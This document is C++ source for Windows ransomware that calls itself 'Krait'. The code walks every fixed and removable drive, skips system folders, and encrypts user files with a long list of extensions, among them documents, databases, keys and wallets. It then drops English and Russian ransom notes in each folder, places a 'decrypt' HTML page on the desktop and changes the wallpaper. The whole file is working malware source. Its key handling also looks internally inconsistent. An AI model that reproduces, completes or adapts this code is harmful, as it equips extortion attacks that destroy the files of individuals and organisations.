#include "file_scanner.h"
#include "encryption.h"
#include "keygen.h"
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <set>

namespace fs = std::filesystem;

std::atomic<bool> FileScanner::stopFlag = false;
std::vector<std::thread> FileScanner::threads;

std::vector<std::string> FileScanner::GetExtensions() {
    return {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
        ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".psd",
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
        ".mp3", ".wav", ".flac", ".aac", ".ogg",
        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
        ".txt", ".rtf", ".odt", ".ods", ".odp",
        ".db", ".sql", ".sqlite", ".mdb",
        ".pst", ".ost", ".msg", ".eml",
        ".iso", ".img", ".vhd", ".vmdk",
        ".ps1", ".bat", ".cmd", ".py", ".js", ".html", ".css",
        ".cpp", ".c", ".h", ".java", ".cs", ".php",
        ".xml", ".json", ".yml", ".yaml", ".ini", ".cfg",
        ".key", ".pem", ".crt", ".cer", ".pfx",
        ".wallet", ".dat", ".bak", ".backup"
    };
}

std::vector<std::string> FileScanner::GetDrives() {
    std::vector<std::string> drives;
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (mask & (1 << i)) {
            std::string drive = std::string(1, 'A' + i) + ":\\";
            UINT type = GetDriveTypeA(drive.c_str());
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                drives.push_back(drive);
            }
        }
    }
    return drives;
}

bool FileScanner::ShouldSkipPath(const std::string& path) {
    static const std::set<std::string> skipDirs = {
        "\\Windows\\", "\\System32\\", "\\SysWOW64\\",
        "\\Program Files\\", "\\Program Files (x86)\\",
        "\\Windows.old\\", "\\$Recycle.Bin\\",
        "\\System Volume Information\\",
        "\\Boot\\", "\\EFI\\", "\\Recovery\\"
    };
    
    std::string lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    for (const auto& dir : skipDirs) {
        std::string lowerDir = dir;
        std::transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
        if (lower.find(lowerDir) != std::string::npos) {
            return true;
        }
    }
    return false;
}

void FileScanner::EncryptDirectory(const std::string& dir, int threadIndex) {
    if (stopFlag) return;
    
    try {
        std::vector<std::string> files;
        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
            if (stopFlag) return;
            if (!entry.is_regular_file()) continue;
            
            std::string path = entry.path().string();
            if (ShouldSkipPath(path)) continue;
            
            std::string ext = fs::path(path).extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            
            auto extensions = GetExtensions();
            if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                files.push_back(path);
            }
        }
        
        auto masterKey = KeyGen::GenerateMasterKey();
        std::string personalKey = KeyGen::GeneratePersonalKey(masterKey);
        Encryption::Initialize(masterKey);
        
        for (const auto& file : files) {
            if (stopFlag) break;
            Encryption::EncryptFile(file);
        }
        
        if (!files.empty()) {
            CreateReadMe(dir, personalKey);
        }
    } catch (...) {
        // Silently continue
    }
}

void FileScanner::EncryptDrive(const std::string& drive, int threadIndex) {
    if (stopFlag) return;
    if (ShouldSkipPath(drive)) return;
    
    try {
        for (const auto& entry : fs::directory_iterator(drive)) {
            if (stopFlag) return;
            if (entry.is_directory()) {
                EncryptDirectory(entry.path().string(), threadIndex);
            }
        }
    } catch (...) {}
}

void FileScanner::CreateReadMe(const std::string& dir, const std::string& personalKey) {
    std::string path = dir + "\\READ_ME.txt";
    std::ofstream file(path);
    if (!file) return;
    
    file << "ENG:\n";
    file << "Hello. Your personal files have been encrypted by the Krait security system! To decrypt your files, you need to open the KRAIT_DECRYPT.html file located on your desktop. On that page, enter your personal key into the input field; you can find this key in the READ_ME.txt file located in each encrypted folder. After entering your personal key, click the \"decrypt\" button and enter the resulting password into the Krait window.\n";
    file << "You personal key: " << personalKey << "\n\n";
    
    file << "RUS:\n";
    file << "Здравствуйте. Ваши личные файлы были зашифрованы системой безопасности Krait! Чтобы расшифровать файлы, откройте файл KRAIT_DECRYPT.html, расположенный на рабочем столе. На открывшейся странице введите свой персональный ключ в поле ввода; этот ключ можно найти в файле READ_ME.txt, который находится в каждой папке с зашифрованными файлами. После ввода персонального ключа нажмите кнопку «decrypt» и введите полученный пароль в окне программы Krait.\n";
    file << "Ваш персональный ключ: " << personalKey << "\n";
    file.close();
}

void FileScanner::CreateDesktopFiles(const std::string& personalKey) {
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    std::string desktop = std::string(desktopPath);
    
    std::string htmlPath = desktop + "\\KRAIT_DECRYPT.html";
    std::ofstream html(htmlPath);
    if (html) {
        html << R"(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Krait Decrypt</title>
<style>
body { background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.container { background: #1a1a1a; padding: 40px; border-radius: 8px; border: 1px solid #333; max-width: 500px; text-align: center; }
h1 { color: #ff3333; font-size: 28px; margin-top: 0; }
p { color: #aaa; line-height: 1.6; font-size: 14px; }
input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 4px; font-size: 16px; margin: 20px 0; box-sizing: border-box; }
input:focus { outline: none; border-color: #ff3333; }
button { background: #ff3333; color: #fff; border: none; padding: 14px 40px; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.3s; }
button:hover { background: #cc0000; }
#result { margin-top: 20px; padding: 10px; background: #0a0a0a; border-radius: 4px; font-family: monospace; word-break: break-all; display: none; }
</style>
</head>
<body>
<div class="container">
<h1>KRAIT DECRYPT</h1>
<p>Enter your personal key from READ_ME.txt to generate decryption password:</p>
<input type="text" id="keyInput" placeholder="XXXX-XXXX-XXXX-XXXX">
<button onclick="decrypt()">DECRYPT</button>
<div id="result"></div>
</div>
<script>
function decrypt() {
    var key = document.getElementById('keyInput').value.trim();
    if (key.length < 16) { alert('Invalid key format'); return; }
    var clean = key.replace(/-/g, '');
    var bytes = [];
    for (var i = 0; i < clean.length; i += 2) {
        bytes.push(parseInt(clean.substr(i, 2), 16));
    }
    var result = '';
    for (var i = bytes.length - 1; i >= 0; i--) {
        var val = bytes[i] ^ 0xAA;
        result += String.fromCharCode(val);
    }
    document.getElementById('result').style.display = 'block';
    document.getElementById('result').textContent = 'Password: ' + result;
}
</script>
</body>
</html>
)";
        html.close();
    }
}

void FileScanner::SetWallpaper() {
    std::string path = "C:\\Windows\\Temp\\krait.webp";
    
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ, (BYTE*)path.c_str(), path.length() + 1);
    RegSetValueExA(hKey, "WallpaperStyle", 0, REG_SZ, (BYTE*)"2", 2);
    RegSetValueExA(hKey, "TileWallpaper", 0, REG_SZ, (BYTE*)"0", 2);
    RegCloseKey(hKey);
    
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void FileScanner::StartEncryption() {
    stopFlag = false;
    auto masterKey = KeyGen::GenerateMasterKey();
    Encryption::Initialize(masterKey);
    std::string personalKey = KeyGen::GeneratePersonalKey(masterKey);
    
    auto drives = GetDrives();
    for (int i = 0; i < drives.size(); i++) {
        threads.emplace_back([i, drives]() {
            EncryptDrive(drives[i], i);
        });
    }
    
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    
    CreateDesktopFiles(personalKey);
    SetWallpaper();
}

void FileScanner::StopEncryption() {
    stopFlag = true;
}
